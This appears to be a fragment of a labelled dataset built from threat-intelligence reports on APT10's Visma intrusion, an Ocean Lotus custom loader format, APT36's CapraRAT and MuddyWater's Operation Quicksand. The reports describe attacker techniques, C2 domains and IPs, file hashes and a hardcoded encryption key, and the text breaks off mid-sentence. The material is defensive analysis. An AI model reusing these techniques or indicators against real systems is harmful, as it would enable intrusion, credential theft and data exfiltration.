shell companies as a front for MSS-enabled cyber activity isn’t a new observation, however. Our research from 2017 concluded that Guangdong ITSEC (and therefore the MSS) directed the activities of a company named Boyusec, which was identified as a shell company for APT3. The December APT10 indictment noted that the group’s malicious activities breached at least 45 companies and managed service providers in 12 countries, including Brazil, Canada, Finland, France, Germany, India, Japan, Sweden, Switzerland, the United Arab Emirates, the United Kingdom, and the United States.Visma offers software and services that simplify and digitize core business processes in the private and public sector. The Visma group operates across the entire Nordic region along with Benelux, Central, and Eastern Europe. With 8,500 employees, more than 850,000 customers, and a net revenue of NOK 8,537 million (approximately $1 billion USD) in 2017, Visma is one of Europe’s leading software companies. Recorded Future’s Insikt Group has actively tracked APT10 for several years, focusing specifically on the group’s targeting of MSPs and global internet infrastructure providers since the Operation Cloud Hopper report in 2017. We were particularly interested in identifying whether any customers of the targeted MSPs were subsequently compromised by APT10, given their potential access through compromised MSP networks. In September 2018, one of our clients (and a supplier as well), Visma, reached out to us for assistance in investigating an incident uncovered on their network following a breach notification by Rapid7. Visma provided us with malware samples and network logs from the event. Analysis of the data revealed that Visma’s Citrix infrastructure had been probed and subsequently accessed using stolen credentials as early as August 17, 2018. This was followed by an initial exploitation, network enumeration, and malicious tool deployment on various Visma endpoints within two weeks of initial access. The theft of enterprise login credentials was conducted within two and a half weeks of initial access. On August 30, 2018, APT10 deployed their first modified version of Trochilus that had its C2 communications encrypted using Salsa20 and RC4 ciphers instead of the more common RC4-encrypted Trochilus variant seen in the wild. This sample, similar to other Trochilus samples, was deployed using a DLL sideloading method utilizing three files, uploaded to the same folder on the victim machine as identified in US-CERT advisory TA17-117A (last revised on December 20, 2018). This method involves the use of a legitimate binary (File 1) used to load a malicious DLL (File 2). The malicious DLL is renamed to match the name of an expected DLL to be loaded by the executable. The malicious DLL then decrypts and decompresses shellcode contained within a third file placed by the attackers in the same temporary folder. The configuration file then loads the Trochilus payload into memory by injecting it into a valid system process. This method of malicious payload installation is a well-documented TTP of APT10. The attackers used Mimikatz (pd.exe) to enable credential theft and made use of scheduled tasks via the Microsoft BITSAdmin utility to transfer files from their C2 to the Visma network. The attackers preferred to upload their malicious tooling to the C:\\ProgramData\\temp or C:\\ProgramData\\media directories and executed commands using batch files (x.bat). A full list of the filenames of the suspected attacker tooling can be found in the report appendices. BITSAdmin example commands used by the attackers. In order to exfiltrate the compromised data, the attackers employed custom malware that used Dropbox as its C2. They also used WinRAR and cURL for Windows, both often renamed, to compress and upload the exfiltrated files from the Visma network to the Dropbox API. Our research partner Rapid7 investigated the Dropbox use and found that the attackers had used the same account to store exfiltrated data from a global apparel company. They also identified broadly similar TTPs being used in the attack against a U.S. law firm specializing in intellectual property law. The firm has a dedicated China practice aimed at assisting Chinese companies entering the U.S. market. Rapid7’s investigation revealed the law firm was first targeted in late 2017, followed by the apparel company a few months later, and finally, the Visma attack in August 2018. In one of the attacks, Rapid7 identified the attackers escaping a Citrix application in order to run the payload script on the victim desktop. Interestingly, in all three attacks, the targeting of Citrix remote desktops was a common thread. Additionally, the same DLL sideloading technique observed in the Visma attack was used, and many of the tools deployed by the attackers shared naming similarities as well (1.bat, cu.exe, ss.rar, r.exe, pd.exe). Most interestingly, Rapid7 observed the use of the Notepad++ updater gup.exe as a legitimate executable to sideload a malicious DLL (libcurl.dll) in order to deploy a variant of the UPPERCUT backdoor (also known as ANEL). APT10 used this approach to deploy UPPERCUT when targeting Japanese corporations in July 2018. APT10 actors gained initial access to the Visma network around August 17, 2018. Examination of network logs revealed an employee’s credentials were stolen and used to authenticate to the network outside of her normal working hours. While we are confident that APT10 actors gained access to the Visma network in August using stolen employee Citrix remote desktop credentials, it is not clear how or when these credentials were initially compromised. Throughout August 2018, the APT10 actors regularly logged in to the Visma network via accessible Citrix servers using two valid user accounts. The times of the logins were consistent with a GMT+8 timezone, indicative of typical Tianjin, China working hours. On each occasion, the logins were from one of eight VPN endpoints that resolved to IPs in the following tightly defined subnets:VPN Consumer Network is an ambiguous Panama-registered entity. Based on information in WHOIS registration records, the website for the company is vpnconsumer.com, which is a nondescript landing page only containing the abuse contact details and a physical address in Panama. BGP routing information shows that the organization manages 44/24 subnets hosted around the world, many of which resolve to low-cost VPN services, such as ExpressVPN. Insikt Group analysis of network metadata to and from the VPN endpoint IPs revealed consistent connectivity to Citrix-hosted infrastructure from all eight VPN endpoint IPs starting on August 17, 2018 — the same date the first authenticated login to Visma’s network was made using stolen credentials. After almost two weeks, on August 30, 2018, APT10 attackers used their access to the network to move laterally and made their first deployment of an RC4- and Salsa20- encrypted variant of the Trochilus malware using a previously associated DLL sideloading technique. Two separate infection chains leveraging this specific DLL sideloading technique were identified on the Visma network using legitimate known good binaries that had DLL search-order path issues. This means that APT10 actors had two separate access points into the Visma network. Once on the Visma network, APT10 attackers used the Microsoft BITSAdmin CLI tool to copy malicious tools from a suspected attacker-controlled C2 hosted on 173.254.236[.]158 to the \\ProgramData\\temp\\ directory on the infected host.After the files were copied across the attacker-executed CASTSP.exe, this file sideloaded and ran version.dll, which in turn decrypted and decompressed the encrypted shellcode and injected the Trochilus payload into memory. A few days later, APT10 used an almost identical approach used during Infection Chain 1 to deploy Trochilus onto another part of Visma’s network. While the deployed DLL and the encrypted shellcode were named differently, the underlying method of malware installation was the same as Infection Chain 1. The files remotely copied into C:\\ProgramData\\temp\\ using BITSAdmin included:The execution method was identical: CASTSP.exe sideloaded and ran vcruntime140.dll, which decrypted and decompressed the encrypted shellcode configuration and injected the Trochilus payload into a system process in-memory on the host machine. The malware sets used for both infection chains are nearly identical both in infection method and code structure. Because the malware for both infection chains were so similar, it is only necessary to include the in-depth analysis for one chain here, so we focused on Infection Chain 1. It included the binaries below:After the file is loaded, the next function, sub_6a351000, starts the decryption routine for CZYSOYKPOIKKZGUFOIUI. The file is DES-encrypted and the key can be identified being loaded into memory at the start of the decryption routine. This variant of Trochilus is significantly different from some of the reported variants. The C2 infrastructure, network communications, and encryption are different from prior versions, but the code similarities and the use of DLL sideloading demonstrate that this is just another variant of Trochilus. First, the libraries below are included in the Trochilus variant and are known to be a part of the source code upon which Trochilus is based on.Second, the unencrypted C2 beacon, _msgid.23.__serial.0.clientid.xxxxxxxxxxxxxxx, is a well-defined component of the Trochilus source code. The capabilities of Trochilus are well documented in other research reports, but the C2 infrastructure for this variant uses a combination of XOR, RC4, and Salsa20, which is different from what has previously been reported for Trochilus.The C2 domain www.miphomanager[.]com is hardcoded, and after a successful DNS request for the IP address, the Trochilus implant will use that IP address for communication. The encoding and encryption routines used in this variant are different from other variants and use three stages of encryption. Other variants have typically used XOR encoding with RC4 encryption to obfuscate C2 communication.The first stage is a simple rolling XOR function. The rolling XOR key is computed by taking two initial values, Constant 1 and Constant 2, and adding them together. The result is then divided against the divisor 0xff. The remainder of this result is used as the XOR key. On the second iteration, Constant 1 is now saved as Constant 2, and Constant 2 becomes the remainder from the previous operation. They are added together and again divided by the divisor 0xff to produce the next XOR key. This process repeats until the end of the cleartext string. A Python script is provided below showing this encoding function.The resulting data then goes to the second stage, which is RC4 encryption using the hard-coded string NASDKJF7832Hnkjsadf878UHds89iujkhNHKJDHJDH8UIYE98uihwjshewde8w. The main routine shown below takes the key and then sends it to the function sub_B49252, which initializes the key-scheduling algorithm (KSA) and pseudo-random generation algorithm (PRGA), which are the two key components of RC4 encryption.For the final phase, the resulting data from the RC4 encryption is then encrypted again, this time with Salsa20. Salsa20 is another stream cipher that encrypts data in 64-byte blocks. Salsa20 uses a secret key and nonce to initialize the encryption. These values are hard-coded and are:After the message is encrypted, it is then sent via an HTTP POST to the C2 host, which in this case is the domain www.miphomanager[.]com. The HTTP headers are provided in the figure below. DNS log data revealed that requests were made for the malicious Trochilus C2 domain, www.miphomanager[.]com, as early as August 30, 2018 — only two weeks after Visma was initially compromised on August 17, 2018. This slight delay may point to the handing over of active exploitation duties to other operator(s) in a multi-team APT10 effort within the Ministry of State Security for the attack. According to WHOIS information, the malicious miphomanager domain was registered with a relatively small Bahamas-based domain registrar, internet.bs. This registrar is widely noted to host a disproportionate number of rogue or malicious websites, with the registrar aggressively marketing itself as an “offshore” registrar. Other examples of malicious infrastructure registered with internet.bs include domains for APT28’s VPNFilter malware campaign and the registration of the cyber-berkut[.]org domain that was affiliated with the pro-Russian and potentially Russian state-linked threat actor CyberBerkut. The registrant organization name was privacy protected using Whois Privacy Corp, and the registered name servers for the malicious C2 were listed as: Internet.bs and the name servers listed above were noted in the registration of a malicious C2 used in a KHRAT campaign targeting Cambodia. KHRAT is a backdoor trojan purported to be used with the China-linked cyberespionage group DragonOK. All three name servers appear in Recorded Future with an unusual risk rating as they appear in the “Bambenek Consulting C&C Nameserver Blocklist” threat list, because of their prevalence in being associated with a Zeus-based banking trojan, Sphinx.During our investigation, we also found evidence of a legitimate decompression utility typically packaged with Java named “unpack200.exe” being executed on the Visma network. This utility sideloaded Mimikatz (pd.exe) and enabled credential theft from Visma users. Interestingly, the same combination of unpack200.exe to deploy Mimikatz was used by the same attackers in both the apparel company and U.S.-based law firm breaches. Using the newly acquired credentials, the attacker accessed Visma’s Microsoft Active Directory domain controller, deployed Trochilus, and made a copy of the “NTDS.DIT” database file containing Active Directory data for Visma’s corporate network, including password hashes for all users in the domain. The NTDS.DIT file and accompanying stolen data was then packaged up using a renamed WinRAR executable (r.exe) that was transferred across by the attacker who then used cURL for Windows (renamed to “CU.exe”) to upload the exfil to content.dropboxapi.com. The RAR files followed a naming convention of a short run of repeating characters (for example, kkk.rar, ss.rar, pp.rar, dds.rar, gggg.rar, etc). Rapid7 research revealed the exfiltrated content from Visma was uploaded to a Dropbox account that contained files from another incident related to the compromise of an international apparel company that they were investigating.In late 2017, Rapid7 responded to a breach at a U.S.-based law firm. The attacker first gained access to the victim environment through Citrix servers. Once inside the victim network, the attacker deployed their own customized malware and also used known good binaries that have DLL search order hijacking issues in order to perform DLL sideloading to execute customized versions of Mimikatz in order to retrieve passwords. The filename for the custom malware was “ccSEUPDT.exe” (MD5: d8e37f07fdc9827871f0f959519275e1), a legitimate Symantec Security Submission Engine Update Module binary. The custom malware also would have a DLL in the same staging directory and a randomized 15-character uppercase and lowercase alpha character set filename without an extension that contained the shellcode. The attacker used unpack200.exe (MD5: 6807be8466955bafffa568b6da0e785c), a decompression program that comes with Java 8 and their copy of Mimikatz was placed into MSVCR100.DLL (MD5: c8ea12ee884f274ca35fa54a073df130). These methods of initial ingress into the victim networks and the method of obtaining passwords remained consistent TTPs across all victims. The DLL sideloading technique can evade application whitelisting and antivirus software. However, if deployed, systems that perform process.start creation would log the command line being passed to the binary and could be reviewed, and then signatures created that look for the common flags could be passed to Mimikatz. The attacker would also move laterally by mounting the remote drive on a system, copying “1.bat” to it, use task scheduler to execute, and then delete the batch script. In order to perform exfiltration of the stolen data, the attacker used common file compression utilities (rar.exe) to create archives of the information they intended to exfiltrate, and then used common command line-based web clients (curl.exe) to transfer the stolen data to a cloud-based storage provider (Dropbox). This TTP for data exfiltration remained consistent across all victims. To maintain access to the victim network from the external public internet, the attacker deployed password-protected ASP eval webshells (Filename “iisstart.aspx,” SHA256: 243d47fc2a24b391e1153d5c7807c6e5de51aba65fc79465d7b3e5c64d5fac41) within the client environment in order to maintain access. Server-side ASPX payload of the China Chopper webshell. (Source: Rapid7) This resembled the server-side ASPX payload of the China Chopper webshell documented previously. Uploads to VirusTotal in late August 2018 resembling the same filename, iisstart.aspx, indicate the deployed webshell was likely a version of the China Chopper webshell known to have been used by several Chinese threat actors. The attacker also used TeamViewer in order to maintain remote access to compromised systems within the victim environment. In early 2018, Rapid7 identified that the attackers compromised an apparel company, based upon detections and intelligence gathered from the U.S.-based law firm breach. The attacker gained access to the victim’s internet-accessible Citrix systems and authenticated to them from networks associated with low-cost VPN providers owned by VPN Consumer Network. Rapid7 again observed the attackers dropping payloads named “ccSEUPDT.exe.” The attackers used identical TTPs for executing malware and Mimikatz as observed before, by using DLL sideloading with known good binaries that had DLL search order path issues. The attackers used the Notepad++ updater GUP.exe (MD5: f5322b2f18605674b9a0c1757de5fd94), the Java archive decompression utility unpack200.exe (MD5: 6807be8466955bafffa568b6da0e785c), renamed from “coInst.exe,” and Norton Identity Safe binary CASRTSP.exe (MD5: 1e3a57cff7cba8732364c26f4bbdcbe2). These binaries were used to load malware from DLL files MSVCR100.DLL (MD5: 5739c1f17503e21e56667d53ea823401) and libcurl.dll (MD5: 8f07160febdb240909b27aa519bba575). Rapid7 reviewed malware discovered in the victim’s environment and found implants that used Dropbox as the C2. The attackers used the same method of lateral movement by mounting the remote drive on a system, copying 1.bat to it, using task scheduler to execute the batch script, and finally, deleting the batch script. For exfiltration of stolen data, the attacker used WinRAR and renamed “rar.exe” to “r.exe” to create archives, upload them with “curl.exe” (renamed to “c.exe”), and again, use the cloud storage provider Dropbox. Rapid7 discovered that additional data was placed into the Dropbox accounts under control of the attacker during the compromise and was able to attribute data that was placed into it as being owned by Visma. Rapid7 then provided a breach notification to Visma to alert them to this compromise in September 2018.We identified three victims of cyberespionage operations since late 2017 across the managed IT service provider, retail, and legal sectors. The targeted sectors vary significantly, indicating a wide scope of targeting for the group. We assess with high confidence that the attacks were conducted by Chinese MSS threat actor, APT10, based on the evidence outlined in this report, summarized below: We believe APT10 is the most significant known Chinese state-sponsored cyber threat to global corporations. Their unprecedented campaign against MSPs, alleged to have included some of the largest MSPs in the world, in order to conduct secondary attacks against their clients, grants the Chinese state the ability to potentially access the networks of hundreds (if not thousands) of corporations around the world. This campaign brings to light further evidence supporting the assertions made by the Five Eyes nations, led by the U.S. Department of Justice indictment against APT10 actors outlining the unprecedented scale of economic cyberespionage being conducted by the Chinese Ministry of State Security. Crucially, the variety of businesses targeted prove that these campaigns are being conducted against corporations across the commercial spectrum, aimed at undermining international norms in trade to erode the competitive advantage of companies that have invested heavily in patented technology. This report, alongside the plethora of other reporting on APT10 operations, acutely highlights the vulnerability of organizational supply chains. Often, third parties in the supply chain are less likely to adopt high-end, expensive security measures, and therefore offer an attacker a convenient access vector to target interconnected organizations. Also, the targeting of cloud providers exploits the trust companies place in the security of the cloud services they use. Based on available information, we assess that this intrusion was conducted by the group that is known as APT10. However, during the course of this investigation, we have had privileged conversations that lead us to believe that in the future, portions of what is now known as APT10 will be recategorized as a new group. There is insufficient data at this time to make that distinction.Recorded Future recommends organizations conduct the following measures outlined in this section in conjunction with the advice published by US-CERT and the U.K.’s NCSC when defending against APT10 attempts to gain network access.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "Recently, at the SAS conference I talked about “Funky malware formats”—atypical executable formats used by malware that are only loaded by proprietary loaders. Malware authors use them in order to make static detection more difficult, because custom formats are not recognized as executable by AV scanners. Using atypical formats may also slow down the analysis process because the file can’t be parsed out of the box by typical tools. Instead, we need to write custom loaders in order to analyze them freely. Last year, we described one such format in a post about Hidden Bee. This time, we want to introduce you to another case that we discussed at the SAS Conference. It is a sample of Ocean Lotus, also known as APT 32, a threat group associated with Vietnam. The sample comes with two elements—BLOB and CAB—that are both executables in the same unknown format. The custom format is achieved by conversion from PE format (we can guess it by observing some artifacts typical for PE files, i.e. the manifest) However, the header is fully custom, and the way of loading it has no resemblance with PE. Some of the information from a typical PE (for example, the layout of the sections) is not preserved: sections are shuffled.Content of the phishing email, along with its attachment The title “Sổ tay vấn đề pháp lý cho các nhà hoạt động nhân quyền” translates to: “Handbook of legal issues for human rights activists.” It’s a subject line for a spear phishing campaign targeting Vietnamese activists. The malicious sample was delivered as an attachment to the email: a zipped executable. The icon tried to imitate a PDF (FoxitPDF reader). An executable with FoxitFDF icon The main executable and the decoy copied to the Temp folder While the user is busy reading the launched document, the dropper unpacks the real payload. It is dropped into C:\\ProgramData\\Microsoft Help: All the elements of the malware unpacked The dropper executable is deleted afterwards. The malware manages to bypass UAC at default level. We can see the application sporder.exe running with elevated privileges. Persistence is provided by a simple Run key, leading to the dropped script: Import table of SPORDER.exe (view from PE-bear) SPORDER.dll imports another of the dropped DLLs, hp6000.dll:Import table of SPORDER.exe (view from PE-bear) The key malware functionality is, however, not provided by any of the dropped PE files. They are just used as loaders. As it turns out, the core is hidden in two unknown files: BLOB and CAB.The files with extensions BLOB and CAB are obfuscated with XOR. After decoding them, we notice some readable strings of code. However, none of them are valid PE files, and we cannot find any of the typical headers.The BLOB file looks like a processed PE file, however, its sections appear to be in swapped order. The first section seems to be .data, instead of .text. We can see visible artifacts from the BZIP library and C++ standard library.This sample also has a custom header, which does not resemble the PE header. However, we found sections inside that are typical for PE files, for example, a manifest.As it turned out, both files are loaded by hp6000.dll: 67b8d21e79018f1ab1b31e1aba16d201 The loading function is executed in an obfuscated way: when the DllMain is executed, it patches the main executable that loaded the DLL.First, the file name of the current module is retrieved. Then, the file is read and the address of the entry point is fetched. Then, the analogical module that is loaded in the memory is set as an executable:Using VirtualProtect to make the main module writable Finally, the bytes are patched so that the entry point will redirect back to the appropriate function in the loading DLL:Patching the entry point of the main module, byte by byte This is how the entry point of the main module looks after the patch is applied:The Entry Point of the main module (sporder.exe) after patching We see that the Virtual Address (RVA 0x1210 + DLL loading base) of the function within the DLL is moved to EAX, and then the EAX is used as a jump target. The function that starts at RVA 0x1210 is a loader for BLOB and CAB： This redirection works, thanks to the fact that when the executable is loaded into the memory, before the Entry Point of the main module is hit, all the DLLs that are in its Import Table are loaded, and the DllMain of each is called. Just after the DLLs are loaded, the execution of the main executable starts. And in our case, the patched entry point redirects back to the DLL. As you can see, the CAB file is loaded first: Executing the function loading CAB file (unconditional) Further, we see this function retrieving some environmental variable. This variable is used to store the state of the application, and is shared between consecutive executions. Depending on this state, one of multiple execution paths can be taken. The name of the variable is created by concatenating:The content variable may be one of the following: ‘@’, ‘*’,’:’. If it is empty, the first value ‘@’ is set. Those variables are translated to particular states that control the flow. The main process is restarted on each state change. Finally, the state 3 creates mutex and loads the file with the BLOB extension.By comparing the format that is loaded in the memory with the format that is stored on the disk, we can see that the beginning and the end of the BLOB is skipped in the loading process. So, we can guess that those parts are some headers that contains the information necessary for loading, but not for execution. The header at the beginning of the file will be referenced as Header1, and the one at the end (footer) will be referenced as Header2.Comparing the memory dump with the raw file We also found that some of the addresses were relocated (the new Image Base was added). View from IFL (Interactive Functions List) The core of the loader is in the following function: This is the function that we need to analyze in order to make sense out of the custom format. Let’s take a look at the loading process itself. First, DWORD of the Header1 is skipped. Then, we have two DWORDs that are used as an XOR key. Once they are fetched, the rest of the header is decoded.After applying the key, we get the content of the file in its clear form. The next value from the headers is used in the formula calculating the size for loading the executable part of the module. In the currently analyzed case (the CAB file), it is 0x17000: Then, 0x17000 bytes of the payload is copied, but the beginning containing the Header1 is skipped (the first 16 bytes). After the module content is copied, Header2 is used to continue loading. Looking at Header2, we can see some similarities with Header1. Again, the initial DWORD is skipped, and then we have a value that is used in a formula calculating the size of the memory to be allocated. The new memory region that is being allocated this time is used for the imports that are going to be loaded (the full process will be explained further). Conceptually, we can divide Header 2 into two parts. First comes a prolog that contains two DWORD values. Example from the currently-analyzed CAB file:Then there is a list of records of a custom type. Each record represents a different piece of information that is necessary for loading the module. They are identified by the type ID that is represented by a DWORD at the beginning of the record. Type 2 stands for entry point or an exported function. The pointed address is stored on the list in order to be called later, after the loading finished. This record has three DWORD parameters.By observing the execution flow, we can confirm that indeed the stored entry point of the module is being called later:In contrast to PE format, the address of the imported function is not loaded into the main module. Instead, it is written into the separate executable area (in the given example it is written at VA: 0x00240001):And then, the address where the import was filled is filled back in the main module. The address in the main module that needs to be filled is specified by the last parameter of this record. In the given example, chunk[3] = 0x0000E014 is being filled by 0x00240001:The functions from the embedded list are for a loader, however, as mentioned earlier, the addresses are not filled in a normal IAT, typical for PE format. Rather, all are filled as a list of jumps stored in a newly-allocated memory page. Address of the imported function is retrieved and written into the emitted jump Meaning of the type field The import record has a field type, that can have one of the following values: 1,2,3,4. The 1 and 2 are the most important: They are used for loading the imports. 1 stands for loading by ordinals, 2 for loading by name. The remaining 3 and 4 are used for cleanup of the fields that are no longer needed. 3 erases import name, 4 erases DLL name.The CAB file is loaded first, just to install the malware, and then deleted. All the espionage-related features are performed by the BLOB that is loaded later and kept persistent in the memory of the loader. In addition to being in a custom format, BLOB is also heavily obfuscated. We can observe its attempts to connect to one of the CnCs: Some of those domains are known from previous reports on Ocean Lotus, i.e. [the Cyclance white paper].Ocean Lotus often surprises researchers with its creative obfuscation techniques. Recently, a different sample of Ocean Lotus was found using steganography to hide their executables (you can read more about it in the report of ThreatVector). The format that we described is just one of many unusual forms that their implants can take.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "APT36, also known as Earth Karkaddan, a politically motivated advanced persistent threat (APT) group, has historically targeted Indian military and diplomatic resources. This APT group (also referred to as Operation C-Major, PROJECTM, Mythic Leopard, and Transparent Tribe) has been known to use social engineering and phishing lures as an entry point, after which, it deploys the Crimson RAT malware to steal information from its victims. In late 2021, we saw the group leverage CapraRAT, an Android RAT with clear similarities in design to the group’s favored Windows malware, Crimson RAT. It is interesting to see the degree of crossover in terms of function names, commands, and capabilities between the tools, which we cover in more detail in our technical brief, “Earth Karkaddan APT.” Our investigation is based on Trend Micro Smart Protection Network (SPN) data gathered from January 2020 to September 2021. Typically, Earth Karkaddan’s arrival methods include the use of spear-phishing emails and a USB worm that would then drop and execute a remote access trojan (RAT). The malicious emails feature a variety of lures to deceive victims into downloading malware, including fraudulent government documents, honeytraps showing profiles of attractive women, and recently, coronavirus-themed information. Once the victim downloads the malicious macro, it will decrypt an embedded executable dropper that is hidden inside a text box, which will then be saved to a hardcoded path prior to it executing in the machine. Once the executable file is executed, it will proceed to unzip a file named mdkhm.zip and then execute a Crimson RAT executable named dlrarhsiva.exe. Earth Karkaddan actors are known to use the Crimson RAT malware in its campaigns to communicate with its command-and-control (C&C) server to download other malware or exfiltrate data. Our analysis shows that the Crimson RAT malware is compiled as a .NET binary with minimal obfuscation. This could indicate that the cybercriminal group behind this campaign is possibly not well-funded. Crimson RAT can steal credentials from browsers, collect antivirus information, capture screenshots, and list victim drives, processes, and directories. We have observed how an infected host communicates with a Crimson RAT C&C server to send exfiltrated information including PC name, operating system (OS) information, and the location of the Crimson RAT malware inside the system. Aside from the Crimson RAT malware, the Earth Karkaddan APT group is also known to use the ObliqueRat malware in its campaigns. This malware is also commonly distributed in spear-phishing campaigns using social engineering tactics to lure victims into downloading another malicious document. In one of its most recent campaigns, the lure used was that of the Centre for Land Warfare Studies (CLAWS) in New Delhi, India. Once the victim clicks the link, it will download a document laced with a malicious macro. Upon enabling the macro, it will then download the ObliqueRat malware that is hidden inside an image file. The macros inside the file will then download a bitmap image (BMP) file where the ObliqueRAT malware is hidden, decode the downloaded BMP file, then create a persistence mechanism by creating a Startup URL which will automatically run the ObliqueRAT malware. Note that in this specific campaign, both the Crimson RAT malware downloader document and the ObliqueRat malware downloader share the same download domain, which is sharingmymedia[.]com. This indicates that both malware types were actively used in Earth Karkaddan APT campaigns. Aside from using spear-phishing emails and a USB worm as arrival vectors, Earth Karkaddan also uses Android RATs that could be deployed by means of malicious phishing links. This is not particularly novel for the APT group — in 2018, it used StealthAgent (detected by Trend Micro as AndroidOS_SMongo.HRX), an Android spyware that can intercept phone calls and messages, track victims’ locations, and steal photos. In 2020, Earth Karkaddan used an updated version of the AhMyth Android RAT to target Indian military and government personnel via a disguised porn app and a fraudulent national Covid-19 tracking app. We observed this group using another Android RAT — TrendMicro has named this “CapraRat”— which is possibly a modified version of an open-source RAT called AndroRAT. While analyzing this android RAT, we saw several similar capabilities to the CrimsonRat malware that the group usually uses to infect Windows systems. We have been observing CapraRAT samples since 2017, and one of the first samples we analyzed (SHA-256: d9979a41027fe790399edebe5ef8765f61e1eb1a4ee1d11690b4c2a0aa38ae42, detected by Trend Micro as as AndroidOS_Androrat.HRXD) revealed some interesting things in that year: they used “com.example.appcode.appcode” as the APK package name and used a possible public certificate “74bd7b456d9e651fc84446f65041bef1207c408d,” which possibly meant the sample was used for testing, and they just started to use it for their campaigns during that year. The C&C domain android[.]viral91[.]xyz, where the malware was connecting to also shows that it is very likely that the APT team uses subdomains to host or connect to Android malware. In previous years, some CrimsonRAT samples were also found to be hosted on the viral91[.]xyz domain. We were also able to source a phishing document, “csd_car_price_list_2017,” that is related to this domain and has been seen in the wild in 2017. This file name is interesting as “csd” is likely to be associated to “Canteen Stores Department” in Pakistan, which is operated by the Pakistani Ministry of Defence. This is a possible lure for the Indian targets to open the malicious attachment, also used in a similar attack in 2021. Upon downloading this malicious app that possibly arrived via a malicious link, the user will need to grant permissions upon installation to allow the RAT access to stored information. The malware can do the following on a compromised device:Once the Android RAT is executed, it will attempt to establish a connection to its C&C server, 209[.]127[.]19[.]241[:]10284. We have observed that the Remote Desktop Protocol (RDP) certificate associated in this deployment, “WIN-P9NRMH5G6M8,” is a common string found in previously identified Earth Karkaddan C&C servers.This APK file also has the ability to drop mp4 or APK files from asset directory.The RAT also has a persistence mechanism that always keeps the app active. It checks whether the service is still running every minute, and if it is not, the service will be launched again.Earth Karkaddan has been stealing information since 2016 by means of creative social engineering lures and file-stealing malware. Users can adopt the following security best practices to thwart Earth Karkaddan attacks:\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "During September 2020, we identified a new campaign targeting many prominent Israeli organizations. The campaign was attributed to the Iranian threat actor ‘MuddyWater’ (also known as TEMP.Zagros, Static Kitten and Seedworm). MuddyWater was previously exposed as a contractor for the IRGC (Islamic Republic Guard Corps)1 . ClearSky and Profero comprehensively researched this campaign. During the campaign, the group attempted to install a variant of the “PowGoop”, a malicious replacement to Google update dll. Based on PaloAlto report2 , “PowGoop” is a loader for a variant of Thanos ransomware with destructive capabilities. We assess that the group is attempting to employ destructive attacks (the likes of the NotPetya attack from 2017), via a disguised as ransomware attacks. Although we didn’t see execution of the destruction in the wild, due to the presence of the destructive capabilities, the attribution to nation-state sponsored threat actor, and the realization of this vector in the past, a destructive purpose is more likely than a ransomware that is being deployed for financial goals. On September 4th, PaloAlto published a report about this destructive variant of Thanos ransomware without attributing it to any known threat actor. However, the organizations that were targeted in the campaign were state-run organizations in the Middle East and North Africa. The loader of this variant dubbed ‘PowGoop’, is a fake Google Update mechanism and was attributed to MuddyWater based on code similarities with the MoriAgent / PudPoul dll loader. In our analysis, we identified two primary attack vectors: This is not the first time that Iranian threat actors use wipers as part of their TTPs. The threat actor APT33 used wipers in at least three different attacks, the most notorious of them being the Shamoon attack. In contrast to APT33, MuddyWater is known for their social engineering campaigns. The primary objectives of previous MuddyWater campaigns were espionage and information theft. In ‘Operation Quicksand’ we uncovered the first known instance of a potentially destructive attack executed by MuddyWater, focusing on prominent organizations in Israel and in other countries around the world. We identified a repetitive PDB path in the networks that were researched containing the word ‘Covic’. This may indicate a covid-19 inspiration and suggests the possible dates in which MuddyWater might have developed the malware. Destructive campaigns were engaged by Iranian threat actors in the past, particularly targeting the Arabian Peninsula. However, destructive attacks of this scale have only been observed once prior to the current event, and the perpetrator was not MuddyWater. In 2012, a threat actor based in Iran used Shamoon wiper in their attacks against Aramco, the oil and gas company from Saudi Arabia4 . In 2016-2018, two more variants of Shamoon were exposed5 . These attacks were previously attributed to APT33 (Elfin) by FireEye6 and McAfee7 . In 2019-2020, a couple new wipers – ZeroCleare8 and Dustman9 , were exposed in 2 operations against entities in the Arabian Peninsula. Dustman and ZeroCleare were both attributed to APT33 and APT34. In May 2020, Fox News reported on an offensive CNA (Cyber Network Attack) executed by Iran which targeted Israel's Water and Sewage Systems10. The Israeli national cyber authority did not confirm that Iran was behind this attack. Despite previous instances of Iranian threat actors using wipers, an attempt to camouflage the wiper as a ransomware was not yet reported.The ransomware Petya surfaced in 201611, targeting Microsoft Windows-based systems. It was one of the largest documented ransomware attacks. Not long after, a similar ransomware was observed attacking primarily Ukrainian entities, amongst other targets. This malware was designed to resemble a ransomware, while its real purpose is to damage the network. Files were encrypted, but the malware was modified so that it could not revert and decrypt the files. The NotPetya attack was attributed to the Sandworm group (also known as Voodoo Bear and Iron Viking) – a threat actor based in Russia. The attack vector in Operation Quicksand is almost identical. According to PaloAlto, the attacker can install ‘Thanos Ransomware’ variant using the PowGoop loader in the compromised asset. Once the (allegedly) ‘Thanos Ransomware’ is installed on the victim’s system, the victim will be presented with a ‘How to decrypt’ message. However, the file will overwrite the MBR.In ‘Operation Quicksand’, the MuddyWater group used a few malicious files, as well as legitimate files that were used to achieve the group’s goals. The tools and techniques used by the group may be divided into several groups:The different tools and techniques used by the group are divided in the following table according to their Kill Chain Method. In this comprehensive research, we identified 2 attack vector types – exploit-based (which will be mentioned as type A) and social engineering-based (which will be mentioned as type B). Following is the mentioned division by type:As observable, the chains are almost identical. However, the major difference between the attack vectors is the injection method. The following table shows the overlaps between the tools and techniques that we have found in the operation, dividing them according to attack vector – social engineering (type a) and vulnerability exploitation (type b).An attack campaign waged against prominent Israeli organizations was revealed during the first week of September through our monitoring system. We identified many resemblances in TTPs with previous attacks, attributing the current campaign to MuddyWater accordingly. During our analysis, we were able to identify PowGoop’s payload in several organizations, with similarities to TTPs reported in PaloAlto report. The first attack vector included exploiting vulnerabilities in the victim’s network, installing relevant tools that enable the attacker to gain persistency, and downloading the PowGoop payload. The second attack vector is more “common” and includes social engineering methods and a malicious Macro in its infection phase. In this chapter, we will present a summary of the two attack vectors used by the group. Both infection vectors will be covered (and will be divided based on the tools, techniques, or procedures the attacker use), followed by the installation of PowGoop , which was exposed as the loader of Thanos.The first attack vector entails exploiting known vulnerabilities in OWA, Microsoft Exchange servers or using ZeroLogon Windows vulnerabilities. These are followed by vulnerabilities with different access systems that were used by the attackers:A remote code execution vulnerability exists in Microsoft Exchange software when the software fails to properly handle objects in memory, aka the 'Microsoft Exchange Memory Corruption Vulnerability'17 . The exploitation provides the attacker SYSTEM level code execution privileges.An elevation of 